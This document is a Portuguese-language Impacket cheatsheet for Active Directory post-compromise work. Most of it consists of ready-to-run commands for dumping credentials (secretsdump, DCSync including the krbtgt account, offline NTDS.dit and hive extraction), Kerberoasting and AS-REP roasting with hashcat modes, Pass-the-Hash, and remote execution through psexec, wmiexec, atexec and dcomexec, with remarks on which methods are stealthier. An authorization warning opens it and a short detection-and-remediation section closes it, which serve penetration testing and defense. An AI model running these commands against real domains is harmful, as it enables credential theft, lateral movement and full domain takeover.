# Impacket — Cheatsheet de Pós-Comprometimento Active Directory

> **USO AUTORIZADO.** Use somente em engajamentos com escopo e autorização por escrito. Execução remota e dump de credenciais são ações intrusivas e ruidosas — registre horário, host de origem e comando para o relatório.

A suíte Impacket é instalada como scripts Python (`impacket-secretsdump`, `secretsdump.py`, etc., dependendo do pacote). Aqui usamos a forma `nome.py`; em distros como Kali os binários costumam ter o prefixo `impacket-`.

## Convenção de credenciais (target spec)

Quase todo script aceita o formato unificado:

```
[domain/]username[:password]@<target>
```

Flags de autenticação comuns:

```bash
# Senha em texto (será solicitada se omitida após os ':')
DOMAIN/user:'Senha123!'@10.10.10.10

# Pass-the-Hash (LM:NT — use 32 zeros no LM se só tiver o NT)
-hashes 00000000000000000000000000000000:<NThash>

# Kerberos com ticket do cache (KRB5CCNAME)
-k -no-pass

# Forçar nome/DC (útil quando DNS/realm não resolve)
-dc-ip 10.10.10.5 -target-ip 10.10.10.10
```

## secretsdump — extração de credenciais

```bash
# Dump remoto via DRSUAPI/SAM/LSA (admin local ou DA no alvo)
secretsdump.py DOMAIN/admin:'Senha'@10.10.10.10

# DCSync: replica os hashes do domínio inteiro a partir do DC
# (requer privilégios de replicação: DS-Replication-Get-Changes[-All])
secretsdump.py -just-dc DOMAIN/admin:'Senha'@dc01.domain.local

# Apenas hashes NTLM (sem Kerberos keys) e histórico de senhas
secretsdump.py -just-dc-ntlm -history DOMAIN/admin:'Senha'@dc01.domain.local

# DCSync de um único usuário (mais cirúrgico/silencioso)
secretsdump.py -just-dc-user 'DOMAIN/krbtgt' DOMAIN/admin:'Senha'@dc01.domain.local

# Pass-the-Hash
secretsdump.py -hashes :<NThash> DOMAIN/admin@10.10.10.10

# Offline a partir de hives extraídos (reg save SAM/SYSTEM/SECURITY)
secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL

# Offline de NTDS.dit + SYSTEM (cópia VSS do DC)
secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
```

Saída relevante:
- `aad3b435...:<NThash>` — hash NTLM (alimenta hashcat `-m 1000` ou Pass-the-Hash).
- Bloco `[*] Kerberos keys grabbed` — chaves `aes256-cts`, `aes128`, `des` (úteis para overpass-the-hash).
- `[*] Cleartext password` — credenciais em cache LSA/autologon.

## GetUserSPNs — Kerberoasting

Extrai TGS de contas de serviço com SPN para cracking offline (a conta não precisa ser privilegiada; basta qualquer usuário de domínio autenticado).

```bash
# Listar contas com SPN
GetUserSPNs.py DOMAIN/user:'Senha' -dc-ip 10.10.10.5

# Solicitar os tickets e salvar em formato hashcat
GetUserSPNs.py DOMAIN/user:'Senha' -dc-ip 10.10.10.5 -request -outputfile spns.hash

# Direcionar a um usuário específico
GetUserSPNs.py DOMAIN/user:'Senha' -dc-ip 10.10.10.5 -request-user svc_sql
```

Quebra com hashcat: `hashcat -m 13100 spns.hash wordlist.txt` (RC4/etype 23). Para AES (etype 17/18) use `-m 19600`/`-m 19700`.

### GetNPUsers — AS-REP Roasting

Contas com *Do not require Kerberos preauthentication* permitem obter um AS-REP crackeável sem credenciais válidas.

```bash
# Sem credenciais, a partir de uma lista de usuários
GetNPUsers.py DOMAIN/ -no-pass -usersfile users.txt -dc-ip 10.10.10.5

# Autenticado, enumerando o domínio e pedindo tickets
GetNPUsers.py DOMAIN/user:'Senha' -request -format hashcat -outputfile asrep.hash
```

Cracking: `hashcat -m 18200 asrep.hash wordlist.txt`.

## Execução remota

| Script | Mecanismo | Ruído / Artefato |
|---|---|---|
| `psexec.py` | Serviço SMB + ADMIN$ (RemCom-like) | Alto — cria serviço, escreve binário, gera Event 7045 |
| `smbexec.py` | Serviço temporário + saída via arquivo | Alto, mas sem upload de binário |
| `wmiexec.py` | WMI (Win32_Process) + SMB para output | Médio — sem serviço, semi-interativo |
| `atexec.py` | Agendador de tarefas | Médio |
| `dcomexec.py` | DCOM (MMC20/ShellWindows) | Médio |

```bash
# Shell SYSTEM interativo (psexec)
psexec.py DOMAIN/admin:'Senha'@10.10.10.10

# WMI exec (mais furtivo, sem serviço) + PtH
wmiexec.py -hashes :<NThash> DOMAIN/admin@10.10.10.10

# Comando único não-interativo
wmiexec.py DOMAIN/admin:'Senha'@10.10.10.10 'whoami /all'

# atexec com Kerberos
atexec.py -k -no-pass DOMAIN/admin@host01.domain.local 'ipconfig /all'
```

## Pivot Kerberos rápido

```bash
# Obter TGT e exportar para o cache
getTGT.py DOMAIN/user:'Senha' -dc-ip 10.10.10.5
export KRB5CCNAME=user.ccache

# Usar o ticket em qualquer script
wmiexec.py -k -no-pass DOMAIN/host01.domain.local
```

Dica: para `-k` funcionar, alvo deve ser pelo **FQDN** (não IP) e o relógio sincronizado com o DC (`ntpdate`/`rdate`) — clock skew > 5 min quebra Kerberos.

## Notas de detecção e remediação

- **DCSync:** monitorar Event ID 4662 com GUID de replicação por princípios não-DC; restringir `DS-Replication-Get-Changes-All` apenas a DCs e contas de sincronização legítimas.
- **Kerberoasting:** usar gMSA/contas de serviço gerenciadas, senhas longas (>25 chars) e AES-only; alertar em volume anômalo de Event 4769 com etype RC4 (0x17).
- **AS-REP Roasting:** remover *DONT_REQUIRE_PREAUTH* de todas as contas (auditar via LDAP `userAccountControl:1.2.840.113556.1.4.803:=4194304`).
- **psexec/wmiexec:** alertar em Event 7045 (criação de serviço), 4688 com `cmd.exe`/`powershell.exe` filho de `wmiprvse.exe`/`services.exe`; restringir SMB lateral e admins locais (LAPS).
- **Pass-the-Hash:** habilitar Credential Guard, desabilitar NTLM onde possível, segmentar tiers administrativos.
